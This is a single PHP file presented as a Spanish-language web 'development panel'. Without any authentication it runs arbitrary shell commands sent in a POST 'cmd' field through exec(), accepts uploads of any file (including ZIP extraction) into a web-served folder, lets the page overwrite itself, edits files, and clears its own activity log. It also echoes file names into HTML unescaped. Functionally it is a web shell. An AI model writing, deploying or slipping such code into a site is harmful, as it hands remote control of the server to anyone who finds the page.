<?php
error_reporting(E_ALL);
ini_set("display_errors",1);

// Crear directorio de uploads si no existe
if(!is_dir(__DIR__."/uploads")) mkdir(__DIR__."/uploads", 0777, true);

// Log de actividad
$logFile = __DIR__."/activity.log";
function writeLog($msg){
    global $logFile;
    file_put_contents($logFile, date("Y-m-d H:i:s")." - ".$msg."\n", FILE_APPEND);
}

// Subir archivo
if(isset($_FILES["file"]) && $_FILES["file"]["error"] === 0){
    $dest = __DIR__."/uploads/".$_FILES["file"]["name"];
    if(move_uploaded_file($_FILES["file"]["tmp_name"], $dest)){
        writeLog("Archivo subido: ".$_FILES["file"]["name"]." (".formatBytes($_FILES["file"]["size"]).")");
        
        // Si es ZIP y se marcó descomprimir
        if(isset($_POST["unzip"]) && pathinfo($dest, PATHINFO_EXTENSION) === "zip"){
            $zip = new ZipArchive();
            if($zip->open($dest) === TRUE){
                $extractPath = __DIR__."/uploads/".pathinfo($dest, PATHINFO_FILENAME);
                if(!is_dir($extractPath)) mkdir($extractPath, 0777, true);
                $zip->extractTo($extractPath);
                $numFiles = $zip->numFiles;
                $zip->close();
                writeLog("ZIP descomprimido: ".$_FILES["file"]["name"]." ($numFiles archivos extraídos)");
            } else {
                writeLog("Error al descomprimir ZIP: ".$_FILES["file"]["name"]);
            }
        }
    }
}

// Actualizar index.php
if(isset($_FILES["self"]) && $_FILES["self"]["error"] === 0){
    move_uploaded_file($_FILES["self"]["tmp_name"], __FILE__);
    writeLog("index.php actualizado");
    header("Location: ".$_SERVER["PHP_SELF"]);
    exit;
}

// Eliminar archivo
if(isset($_GET["delete"])){
    $file = basename($_GET["delete"]);
    $path = __DIR__."/uploads/".$file;
    if(file_exists($path)){
        unlink($path);
        writeLog("Archivo eliminado: ".$file);
        header("Location: ".$_SERVER["PHP_SELF"]);
        exit;
    }
}

// Renombrar archivo
if(isset($_POST["rename_old"]) && isset($_POST["rename_new"])){
    $oldName = basename($_POST["rename_old"]);
    $newName = basename($_POST["rename_new"]);
    $oldPath = __DIR__."/uploads/".$oldName;
    $newPath = __DIR__."/uploads/".$newName;
    if(file_exists($oldPath) && !file_exists($newPath)){
        rename($oldPath, $newPath);
        writeLog("Archivo renombrado: $oldName → $newName");
        header("Location: ".$_SERVER["PHP_SELF"]);
        exit;
    }
}

// Guardar archivo editado
if(isset($_POST["edit_file"]) && isset($_POST["edit_content"])){
    $fileName = basename($_POST["edit_file"]);
    $filePath = __DIR__."/uploads/".$fileName;
    file_put_contents($filePath, $_POST["edit_content"]);
    writeLog("Archivo editado: ".$fileName);
    header("Location: ".$_SERVER["PHP_SELF"]);
    exit;
}

// Obtener contenido de archivo para editar
if(isset($_GET["get_content"])){
    $fileName = basename($_GET["get_content"]);
    $filePath = __DIR__."/uploads/".$fileName;
    if(file_exists($filePath)){
        header('Content-Type: text/plain; charset=utf-8');
        echo file_get_contents($filePath);
        exit;
    }
}

// Ejecutar comando shell
if(isset($_POST["cmd"])){
    $cmd = $_POST["cmd"];
    $output = "";
    $cwd = isset($_POST["cwd"]) ? $_POST["cwd"] : __DIR__;
    
    // Cambiar directorio si es comando cd
    if(preg_match('/^cd\s+(.+)$/i', trim($cmd), $matches)){
        $newDir = $matches[1];
        if($newDir === '..'){
            $cwd = dirname($cwd);
        } elseif($newDir === '~'){
            $cwd = $_SERVER['HOME'] ?? __DIR__;
        } else {
            $testPath = $newDir[0] === '/' ? $newDir : $cwd . '/' . $newDir;
            if(is_dir($testPath)){
                $cwd = realpath($testPath);
            } else {
                $output = "Error: Directorio no encontrado";
            }
        }
    } else {
        // Ejecutar comando
        $fullCmd = "cd " . escapeshellarg($cwd) . " && " . $cmd . " 2>&1";
        exec($fullCmd, $outputLines, $returnVar);
        $output = implode("\n", $outputLines);
        if(empty($output)) $output = "Comando ejecutado (sin salida)";
    }
    
    writeLog("Shell ejecutado: $cmd");
    
    header('Content-Type: application/json');
    echo json_encode([
        'output' => $output,
        'cwd' => $cwd
    ]);
    exit;
}

// Limpiar logs
if(isset($_GET["clearlogs"])){
    file_put_contents($logFile, "");
    writeLog("Logs limpiados");
    header("Location: ".$_SERVER["PHP_SELF"]);
    exit;
}

// Función para formatear bytes
function formatBytes($bytes){
    $units = ['B', 'KB', 'MB', 'GB'];
    $i = 0;
    while($bytes >= 1024 && $i < 3){
        $bytes /= 1024;
        $i++;
    }
    return round($bytes, 2)." ".$units[$i];
}

// Obtener uso de memoria
function getMemoryInfo(){
    $memInfo = [];
    if(PHP_OS_FAMILY === "Linux" && file_exists("/proc/meminfo")){
        $memData = file_get_contents("/proc/meminfo");
        preg_match('/MemTotal:\s+(\d+)/', $memData, $total);
        preg_match('/MemAvailable:\s+(\d+)/', $memData, $available);
        if($total && $available){
            $totalMB = round($total[1] / 1024, 2);
            $availableMB = round($available[1] / 1024, 2);
            $usedMB = $totalMB - $availableMB;
            $memInfo = [
                'total' => $totalMB,
                'used' => $usedMB,
                'available' => $availableMB,
                'percent' => round(($usedMB / $totalMB) * 100, 2)
            ];
        }
    }
    return $memInfo;
}

// Obtener info de disco
function getDiskInfo(){
    $total = disk_total_space("/");
    $free = disk_free_space("/");
    $used = $total - $free;
    return [
        'total' => formatBytes($total),
        'used' => formatBytes($used),
        'free' => formatBytes($free),
        'percent' => round(($used / $total) * 100, 2)
    ];
}

$memInfo = getMemoryInfo();
$diskInfo = getDiskInfo();
?>
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Panel de Desarrollo</title>
<style>
*{box-sizing:border-box}
body{margin:0;background:#0e0e0e;color:#fff;font-family:system-ui;padding-bottom:60px}
header{padding:15px;background:#161616;text-align:center;font-weight:700;font-size:20px;position:relative}
.menu-btn{position:absolute;left:15px;top:50%;transform:translateY(-50%);background:#00ff88;color:#000;border:none;padding:10px 15px;border-radius:8px;font-size:20px;cursor:pointer;display:none}
main{padding:12px;max-width:1000px;margin:auto}
.card{background:#1c1c1c;padding:14px;border-radius:10px;margin-bottom:14px;border:1px solid #2a2a2a}
.card b{display:block;margin-bottom:10px;font-size:16px;color:#00ff88}
input,button{width:100%;padding:12px;border-radius:8px;border:0;font-size:14px}
input[type="checkbox"]{width:18px;height:18px}
input{background:#111;color:#fff}
input[type="file"]{padding:10px}
button{background:#00ff88;color:#000;font-weight:700;margin-top:8px;cursor:pointer;transition:0.3s}
button:hover{background:#00dd77}
.btn-danger{background:#ff4444}
.btn-danger:hover{background:#dd2222}
.btn-small{width:auto;padding:8px 16px;font-size:12px;display:inline-block;margin-left:8px}
a{color:#00ff88;text-decoration:none}
.file{padding:12px;background:#121212;border-radius:8px;margin:8px 0;display:flex;justify-content:space-between;align-items:center;border:1px solid #252525}
.file-info{flex:1}
.file-name{font-weight:600;margin-bottom:4px}
.file-size{color:#888;font-size:13px}
.progress{background:#252525;height:20px;border-radius:8px;overflow:hidden;margin:8px 0}
.progress-bar{background:#00ff88;height:100%;display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:700;color:#000;transition:width 0.3s}
.info-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:10px;margin-top:10px}
.info-item{background:#121212;padding:10px;border-radius:6px;border:1px solid #252525}
.info-label{color:#888;font-size:12px;margin-bottom:4px}
.info-value{font-weight:700;font-size:16px}
.log-container{background:#121212;padding:12px;border-radius:8px;max-height:300px;overflow-y:auto;font-family:monospace;font-size:13px;line-height:1.6;border:1px solid #252525}
.log-line{margin:4px 0;color:#0f0}
.log-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:10px}
.modal{display:none;position:fixed;z-index:999;left:0;top:0;width:100%;height:100%;background:rgba(0,0,0,0.9);overflow:auto}
.modal-content{background:#1c1c1c;margin:2% auto;padding:20px;border:1px solid #00ff88;width:90%;max-width:800px;border-radius:12px}
.modal-close{color:#ff4444;float:right;font-size:28px;font-weight:700;cursor:pointer;line-height:20px}
.modal-close:hover{color:#ff6666}
textarea{width:100%;min-height:400px;background:#0a0a0a;color:#0f0;border:1px solid #252525;border-radius:8px;padding:12px;font-family:monospace;font-size:14px;line-height:1.5;resize:vertical}
.file-actions{display:flex;gap:8px}
.terminal{background:#0a0a0a;border:1px solid #252525;border-radius:8px;padding:15px;font-family:monospace;font-size:14px;color:#0f0;min-height:400px;max-height:500px;overflow-y:auto}
.terminal-output{white-space:pre-wrap;word-wrap:break-word;margin-bottom:10px}
.terminal-line{margin:2px 0}
.terminal-input-line{display:flex;align-items:center;gap:8px}
.terminal-prompt{color:#00ff88;font-weight:700}
.terminal-input{flex:1;background:transparent;border:none;color:#0f0;font-family:monospace;font-size:14px;outline:none}
.terminal-cwd{color:#888;font-size:12px;margin-bottom:10px}
.sidebar{position:fixed;left:-280px;top:0;width:280px;height:100%;background:#161616;transition:0.3s;z-index:1000;overflow-y:auto;box-shadow:2px 0 10px rgba(0,0,0,0.5)}
.sidebar.open{left:0}
.sidebar-header{padding:20px;background:#00ff88;color:#000;font-weight:700;font-size:18px;display:flex;justify-content:space-between;align-items:center}
.sidebar-close{background:none;border:none;color:#000;font-size:24px;cursor:pointer;padding:0}
.sidebar-item{padding:15px 20px;border-bottom:1px solid #252525;cursor:pointer;transition:0.2s;display:flex;align-items:center;gap:10px}
.sidebar-item:hover{background:#1c1c1c}
.sidebar-item.active{background:#00ff88;color:#000;font-weight:700}
.overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.7);z-index:999;display:none}
.overlay.open{display:block}
@media(max-width:768px){
.menu-btn{display:block}
.card{padding:12px}
.file{flex-direction:column;align-items:flex-start}
.file-actions{width:100%;margin-top:10px;flex-wrap:wrap}
}
</style>
</head>
<body>

<div class="overlay" id="overlay" onclick="closeSidebar()"></div>

<div class="sidebar" id="sidebar">
    <div class="sidebar-header">
        📱 Menú
        <button class="sidebar-close" onclick="closeSidebar()">×</button>
    </div>
    <div class="sidebar-item" onclick="showSection('upload')">📤 Subir Archivos</div>
    <div class="sidebar-item" onclick="showSection('update')">🔄 Actualizar Panel</div>
    <div class="sidebar-item active" onclick="showSection('files')">📁 Archivos</div>
    <div class="sidebar-item" onclick="showSection('system')">💻 Sistema</div>
    <div class="sidebar-item" onclick="showSection('logs')">📋 Logs</div>
</div>

<header>
    <button class="menu-btn" onclick="openSidebar()">☰</button>
    🚀 Panel de Desarrollo Web
</header>

<main>

<div class="card section" id="section-upload">
<b>📤 Subir Archivo</b>
<form method="post" enctype="multipart/form-data">
<input type="file" name="file" required>
<label style="display:flex;align-items:center;margin-top:8px;cursor:pointer;user-select:none">
<input type="checkbox" name="unzip" style="width:auto;margin-right:8px">
<span>Descomprimir automáticamente si es ZIP</span>
</label>
<button>Subir Archivo</button>
</form>
</div>

<div class="card section" id="section-update">
<b>🔄 Actualizar index.php</b>
<form method="post" enctype="multipart/form-data">
<input type="file" name="self" required>
<button>Actualizar Panel</button>
</form>
</div>

<div class="card section" id="section-files">
<b>📁 Archivos Subidos (<?php echo count(array_diff(scandir("uploads"), ['.','..'])); ?>)</b>
<?php
$files = array_diff(scandir("uploads"), ['.','..']);
if(count($files) > 0){
    foreach($files as $f){
        $path = "uploads/".$f;
        $size = filesize($path);
        $ext = strtolower(pathinfo($f, PATHINFO_EXTENSION));
        $editableExts = ['txt','php','html','css','js','json','xml','md','htaccess','log','sql','py','java','cpp','c','sh'];
        $isEditable = in_array($ext, $editableExts);
        
        echo "<div class='file'>
                <div class='file-info'>
                    <div class='file-name'>📄 <a href='$path' target='_blank'>$f</a></div>
                    <div class='file-size'>".formatBytes($size)." • ".date("Y-m-d H:i", filemtime($path))."</div>
                </div>
                <div class='file-actions'>
                    ".($isEditable ? "<button class='btn-small' onclick='openEditor(\"$f\")'>✏️ Editar</button>" : "")."
                    <button class='btn-small' onclick='openRename(\"$f\")'>🏷️ Renombrar</button>
                    <a href='?delete=$f' onclick='return confirm(\"¿Eliminar $f?\")'>
                        <button class='btn-small btn-danger'>🗑️ Eliminar</button>
                    </a>
                </div>
              </div>";
    }
} else {
    echo "<p style='color:#888;text-align:center;padding:20px'>No hay archivos subidos</p>";
}
?>
</div>

<!-- Modal Renombrar -->
<div id="renameModal" class="modal">
    <div class="modal-content">
        <span class="modal-close" onclick="closeRename()">&times;</span>
        <h2 style="color:#00ff88;margin-top:0">🏷️ Renombrar Archivo</h2>
        <form method="post">
            <input type="hidden" name="rename_old" id="rename_old">
            <input type="text" name="rename_new" id="rename_new" placeholder="Nuevo nombre" required style="margin-bottom:12px">
            <button type="submit">Renombrar</button>
        </form>
    </div>
</div>

<!-- Modal Editor -->
<div id="editorModal" class="modal">
    <div class="modal-content">
        <span class="modal-close" onclick="closeEditor()">&times;</span>
        <h2 style="color:#00ff88;margin-top:0" id="editor_title">✏️ Editor de Texto</h2>
        <form method="post">
            <input type="hidden" name="edit_file" id="edit_file">
            <textarea name="edit_content" id="edit_content" placeholder="Contenido del archivo..."></textarea>
            <div style="display:flex;gap:8px;margin-top:12px">
                <button type="submit" style="flex:1">💾 Guardar Cambios</button>
                <button type="button" onclick="closeEditor()" class="btn-danger" style="flex:1">❌ Cancelar</button>
            </div>
        </form>
    </div>
</div>

<script>
function openSidebar(){
    document.getElementById('sidebar').classList.add('open');
    document.getElementById('overlay').classList.add('open');
}

function closeSidebar(){
    document.getElementById('sidebar').classList.remove('open');
    document.getElementById('overlay').classList.remove('open');
}

function showSection(section){
    // Ocultar todas las secciones
    const sections = document.querySelectorAll('.section');
    sections.forEach(s => s.style.display = 'none');
    
    // Mostrar la sección seleccionada
    document.getElementById('section-' + section).style.display = 'block';
    
    // Actualizar item activo en sidebar
    const items = document.querySelectorAll('.sidebar-item');
    items.forEach(item => item.classList.remove('active'));
    event.target.classList.add('active');
    
    // Cerrar sidebar en móvil
    if(window.innerWidth <= 768){
        closeSidebar();
    }
}

// Mostrar solo archivos por defecto
window.onload = function(){
    showSection('files');
    
    // Inicializar terminal
    const terminalInput = document.getElementById('terminal-input');
    if(terminalInput){
        terminalInput.addEventListener('keypress', function(e){
            if(e.key === 'Enter'){
                executeCommand();
            }
        });
    }
}

let currentCwd = '<?php echo addslashes(__DIR__); ?>';

function executeCommand(){
    const input = document.getElementById('terminal-input');
    const cmd = input.value.trim();
    
    if(!cmd) return;
    
    const output = document.getElementById('terminal-output');
    
    // Mostrar comando ejecutado
    output.innerHTML += '<div class="terminal-line"><span class="terminal-prompt">$ </span>' + escapeHtml(cmd) + '</div>';
    
    // Limpiar input
    input.value = '';
    
    // Enviar comando al servidor
    const formData = new FormData();
    formData.append('cmd', cmd);
    formData.append('cwd', currentCwd);
    
    fetch('', {
        method: 'POST',
        body: formData
    })
    .then(response => response.json())
    .then(data => {
        // Actualizar directorio actual
        currentCwd = data.cwd;
        document.getElementById('cwd').textContent = data.cwd;
        
        // Mostrar salida
        if(data.output){
            output.innerHTML += '<div class="terminal-line" style="color:#aaa">' + escapeHtml(data.output) + '</div>';
        }
        
        // Scroll al final
        document.getElementById('terminal').scrollTop = document.getElementById('terminal').scrollHeight;
    })
    .catch(err => {
        output.innerHTML += '<div class="terminal-line" style="color:#ff4444">Error: ' + err + '</div>';
    });
}

function clearTerminal(){
    document.getElementById('terminal-output').innerHTML = '';
}

function escapeHtml(text){
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

function openRename(fileName){
    document.getElementById('rename_old').value = fileName;
    document.getElementById('rename_new').value = fileName;
    document.getElementById('renameModal').style.display = 'block';
}

function closeRename(){
    document.getElementById('renameModal').style.display = 'none';
}

function openEditor(fileName){
    document.getElementById('edit_file').value = fileName;
    document.getElementById('editor_title').textContent = '✏️ Editando: ' + fileName;
    document.getElementById('edit_content').value = 'Cargando...';
    
    // Cargar contenido del archivo usando PHP
    fetch('?get_content=' + encodeURIComponent(fileName))
        .then(response => response.text())
        .then(data => {
            document.getElementById('edit_content').value = data;
            document.getElementById('editorModal').style.display = 'block';
        })
        .catch(err => {
            alert('Error al cargar el archivo: ' + err);
        });
}

function closeEditor(){
    document.getElementById('editorModal').style.display = 'none';
}

// Cerrar modales al hacer clic fuera
window.onclick = function(event){
    if(event.target.className === 'modal'){
        event.target.style.display = 'none';
    }
}

// Atajo de teclado Ctrl+S para guardar en el editor
document.getElementById('edit_content').addEventListener('keydown', function(e){
    if(e.ctrlKey && e.key === 's'){
        e.preventDefault();
        this.form.submit();
    }
});
</script>

<div class="card">
<b>💻 Información del Sistema</b>
<div class="info-grid">
    <div class="info-item">
        <div class="info-label">Sistema Operativo</div>
        <div class="info-value"><?php echo PHP_OS; ?></div>
    </div>
    <div class="info-item">
        <div class="info-label">Arquitectura</div>
        <div class="info-value"><?php echo php_uname('m'); ?></div>
    </div>
    <div class="info-item">
        <div class="info-label">PHP Version</div>
        <div class="info-value"><?php echo phpversion(); ?></div>
    </div>
    <div class="info-item">
        <div class="info-label">IP Servidor</div>
        <div class="info-value"><?php echo $_SERVER["SERVER_ADDR"] ?? 'localhost'; ?></div>
    </div>
    <div class="info-item">
        <div class="info-label">Memoria PHP</div>
        <div class="info-value"><?php echo ini_get('memory_limit'); ?></div>
    </div>
    <div class="info-item">
        <div class="info-label">Fecha/Hora</div>
        <div class="info-value"><?php echo date("H:i:s"); ?></div>
    </div>
</div>

<?php if(!empty($memInfo)): ?>
<div style="margin-top:16px">
    <div class="info-label">Memoria RAM del Sistema</div>
    <div class="progress">
        <div class="progress-bar" style="width:<?php echo $memInfo['percent']; ?>%">
            <?php echo $memInfo['used']." MB / ".$memInfo['total']." MB (".$memInfo['percent']."%)"; ?>
        </div>
    </div>
</div>
<?php endif; ?>

<div style="margin-top:16px">
    <div class="info-label">Disco Duro</div>
    <div class="progress">
        <div class="progress-bar" style="width:<?php echo $diskInfo['percent']; ?>%">
            <?php echo $diskInfo['used']." / ".$diskInfo['total']." (".$diskInfo['percent']."%)"; ?>
        </div>
    </div>
</div>

<div style="margin-top:16px">
    <div class="info-label">Hostname</div>
    <div class="info-value"><?php echo php_uname('n'); ?></div>
</div>
</div>

<div class="card section" id="section-system">
<div class="log-header">
    <b>📋 Registro de Actividad</b>
    <a href="?clearlogs" onclick="return confirm('¿Limpiar todos los logs?')">
        <button class="btn-small btn-danger">🗑️ Limpiar Logs</button>
    </a>
</div>
<div class="log-container">
<?php
if(file_exists($logFile)){
    $logs = array_reverse(file($logFile));
    $logs = array_slice($logs, 0, 50); // Últimas 50 líneas
    if(count($logs) > 0){
        foreach($logs as $log){
            echo "<div class='log-line'>".htmlspecialchars(trim($log))."</div>";
        }
    } else {
        echo "<div style='color:#888;text-align:center'>No hay registros aún</div>";
    }
} else {
    echo "<div style='color:#888;text-align:center'>No hay registros aún</div>";
}
?>
</div>
</div>

</main>

</body>
</html>